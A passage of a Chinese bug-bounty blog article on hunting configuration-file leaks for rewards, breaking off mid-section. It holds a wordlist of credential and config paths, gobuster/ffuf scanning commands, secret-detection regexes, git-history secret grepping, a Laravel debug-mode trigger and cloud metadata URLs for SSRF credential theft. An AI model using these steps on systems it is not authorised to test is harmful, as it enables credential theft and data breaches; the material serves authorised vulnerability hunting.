#  配置信息泄露：SRC漏洞挖掘的“金矿脉”与工业化狩猎体系  
 sec0nd安全   2026-02-21 12:12  
  
**一个配置文件的泄露，往往意味着整个系统的沦陷——而你需要的，只是知道去哪里找。**  
  
去年，一个暴露在公网的.env  
文件，让我在10分钟内拿到了某金融科技公司的AWS密钥，进而接管了他们的生产数据库。**奖金：12,000元，厂商当天紧急下线所有服务。**  
  
更夸张的案例来自印度某电商巨头：攻击者通过一个文件下载漏洞，层层突破——读取/etc/passwd  
确认系统、访问AWS元数据获取临时凭证、从S3 bucket中找到MongoDB配置、最终拿下10万+用户数据。**这不是小说，这是真实发生的攻击链。**  
  
配置信息泄露在SRC中被称为“新手福利”——不是因为简单，是因为**太常见了，常见到开发人员每天都在犯错，而大多数猎人却视而不见**  
。  
  
本文将首次完整公开我的**配置信息泄露深度狩猎体系**  
——从6类高价值配置、5种发现技巧、7个深度利用案例到自动化武器库，全是干到拧不出水的干货。  
## 第一章 重新认知配置泄露：为什么它是SRC的“高产矿脉”  
### 1.1 配置泄露的四个价值层级  
<table><thead><tr><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">层级</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">利用深度</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">典型操作</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">奖金区间</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">L1：基础泄露</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">直接暴露敏感信息</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">读取</span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">.env</span></code><span leaf="">、</span><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">config.php</span></code><span leaf="">中的数据库密码</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">500-2000元</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">L2：凭证复用</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">用泄露的凭证登录后台/数据库</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">连接MySQL、Redis，获取更多数据</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">2000-5000元</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">L3：组合攻击</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">多个配置组合形成攻击链</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">配置文件+密钥→云服务接管</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">5000-10000元</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><strong style="font-weight: 600;"><span leaf="">L4：代码级沦陷</span></strong></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">从配置到RCE的质变</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">获取加密key构造反序列化链、从jar包逆向0day</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">10000-30000元+</span></section></td></tr></tbody></table>  
**核心认知**  
：配置泄露不是“一个漏洞”，而是一个**通往核心资产的传送门**  
。你的奖金取决于你通过这个门走了多远。  
### 1.2 配置信息泄露的常见形态  
  
**文件形态**  
：  
```
text
.env                    # 环境变量（数据库密码、API密钥）
config.php/config.yml   # 应用配置
web.config              # IIS配置文件
application.properties  # Spring Boot配置
settings.py             # Django配置
database.yml            # Rails数据库配置
```  
  
**路径形态**  
：  
```
text
/backup/                # 备份目录
/.git/                  # Git历史记录
/.svn/                  # SVN历史记录
/.idea/                 # IDE配置
/var/www/html/backup/   # 常见备份路径
```  
  
云形态  
```
text
~/.aws/credentials      # AWS凭证
~/.azure/accessTokens.json # Azure令牌
~/.gcp/credentials.db    # GCP凭证
~/.docker/config.json    # Docker Hub凭证
~/.kube/config          # Kubernetes配置
```  
## 第二章 工业化发现体系：将“偶然”变为“必然”  
### 2.1 字典爆破：最直接、最有效  
  
**我的专属配置文件字典**  
（节选，完整版500+条）：  
```
.env
.env.local
.env.production
.env.development
.env.staging
config.php
config.xml
config.json
config.yml
config.ini
database.php
database.yml
database.ini
wp-config.php
wp-config-sample.php
settings.py
local_settings.py
application.properties
application.yml
bootstrap.yml
web.config
app.config
log4j.properties
logback.xml
nginx.conf
httpd.conf
.htaccess
.aws/credentials
.aws/config
.azure/accessTokens.json
.gcp/credentials.db
.docker/config.json
.kube/config
.git/config
.svn/entries
.idea/workspace.xml
composer.json
package.json
pom.xml
build.gradle
```  
  
**爆破实战参数**  
（使用dirsearch/dirb/gobuster）：  
```
bash
# 高并发爆破配置文件
gobuster dir -u https://target.com -w config_dict.txt -t 100 -x php,xml,json,yml,ini,conf,env,properties
# 递归深度扫描（重要！）
ffuf -u https://target.com/FUZZ -w config_dict.txt -recursion -recursion-depth 3
```  
  
**实战案例**  
：某招聘网站，直接访问/www/.env  
，文件可读，包含阿里云RDS数据库密码和AccessKey。**奖金：4,000元**  
。  
### 2.2 响应包特征扫描  
  
**核心思路**  
：配置文件的响应包往往有固定特征——[database]  
、password=  
、DB_  
等关键词。  
  
**Burp被动扫描配置**  
：  
```
yaml
- 名称: 配置文件泄露检测
  匹配规则:
    - "(?i)DB_(USERNAME|PASSWORD|HOST|NAME)"
    - "(?i)database[_-]?(username|password|host)"
    - "(?i)aws[_-]?(access|secret)[_-]?key"
    - "(?i)SECRET[_-]?KEY"
    - "(?i)API[_-]?KEY"
    - "(?i)password\\s*[=:]\\s*['\"]?[^'\"]+"
  响应码: 200
  备注: 疑似配置文件泄露
```  
### 2.3 Git/SVN历史记录中的“时光漏洞”  
  
**Git泄露的终极利用**  
：  
```
bash
# 检测是否存在.git泄露
git-hound --subdomain-file subs.txt --threads 100
# 下载所有可访问的.git文件
./git_dumper.py https://target.com/.git/ output_dir/
# 恢复完整代码库
git checkout --force
# 分析历史提交中的配置信息（黄金！）
git log -p | grep -E "(password|secret|key|token|AKIA|DB_)"
```  
  
**实战案例**  
：某金融科技公司主站无漏洞，但test.target.com/.git/  
可读。下载后查看git log  
，发现半年前的一次提交注释：“fix: remove hardcoded aws secret”。虽然该文件已被删除，但**历史版本**  
中仍保留着完整的AccessKey和SecretKey。**直接接管生产环境S3存储桶，奖金：8,000元**  
。  
### 2.4 错误页面/调试模式泄露  
  
**Laravel框架的典型漏洞**  
：  
  
当Laravel的调试模式（APP_DEBUG=true  
）开启时，触发错误会暴露数据库连接信息、APP_KEY等敏感配置。  
  
**检测方法**  
：  
1. 识别目标使用Laravel框架  
  
1. 在任意页面（如登录页）抓包  
  
1. 修改HTTP方法（将GET改为PUT/POST/DELETE等非常规方法）  
  
1. 观察是否触发debug模式并返回敏感信息  
  
**实战案例**  
：某SRC目标，访问/admin/upload_img  
（需登录）时使用PUT方法，触发debug模式，返回了MySQL数据库密码和APP_KEY。利用泄露的密码连接数据库，发现10万+用户数据。**奖金：5,000元**  
。  
### 2.5 云元数据服务：云环境的“第一桶金”  
  
当存在SSRF或文件读取漏洞时，云元数据是最高价值目标。  
  
**AWS元数据**  
：  
```
text
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
```  
  
**阿里云元数据**  
：  
```
text
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```  
  
**实战案例**  
：某电商系统存在文件读取漏洞，通过file:///proc/net/fib_trie  
发现内网段，进而找到169.254.169.254  
，读取AWS元数据获取到AccessKeyId和SecretAccessKey，接管S3存储桶。**奖金：8,000元**  
。  
## 第三章 高价值配置目标清单  
### 3.1 Web应用配置（最高频）  
<table><thead><tr><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px 10px 0px;text-align: left;"><section><span leaf="">文件/路径</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">可能泄露的内容</span></section></th><th style="border-bottom: 1px solid rgba(0, 0, 0, 0.12);font: 500 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;border-top: none;padding: 10px 16px;text-align: left;"><section><span leaf="">价值评级</span></section></th></tr></thead><tbody><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">.env</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">数据库密码、API密钥、密钥盐</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">⭐⭐⭐⭐⭐</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">config.php</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">数据库配置、调试开关</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">⭐⭐⭐⭐</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">wp-config.php</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">WordPress数据库密码、密钥</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">⭐⭐⭐⭐</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">application.properties</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Spring Boot配置、数据库连接</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">⭐⭐⭐⭐⭐</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">web.config</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">IIS配置、连接字符串</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">⭐⭐⭐</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">settings.py</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Django配置、密钥</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">⭐⭐⭐⭐</span></section></td></tr><tr><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px 10px 0px;"><code style="box-sizing: border-box;font: 400 13px / 22px Menlo, Monaco, Consolas, &#34;Cascadia Mono&#34;, &#34;Ubuntu Mono&#34;, &#34;DejaVu Sans Mono&#34;, &#34;Liberation Mono&#34;, &#34;JetBrains Mono&#34;, &#34;Fira Code&#34;, Cousine, &#34;Roboto Mono&#34;, &#34;Courier New&#34;, Courier, sans-serif, system-ui;background-color: rgb(235, 238, 242);border-radius: 6px;align-items: center;padding: 0px 5px;display: inline-flex;"><span leaf="">database.yml</span></code></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 16px;"><section><span leaf="">Rails数据库配置</span></section></td><td style="border-bottom: 1px solid rgba(0, 0, 0, 0.1);font: 400 15px / 25px quote-cjk-patch, Inter, system-ui, -apple-system, BlinkMacSystemFont, &#34;Segoe UI&#34;, Roboto, Oxygen, Ubuntu, Cantarell, &#34;Open Sans&#34;, &#34;Helvetica Neue&#34;, sans-serif;min-width: 100px;max-width: min(30vw, 320px);padding: 10px 0px 10px 16px;"><section><span leaf="">⭐⭐⭐⭐</span></section></td></tr></tbody></table>### 3.2 云服务凭证（最高危）  
  
红队工具Vermilion专门收集的敏感目录：  
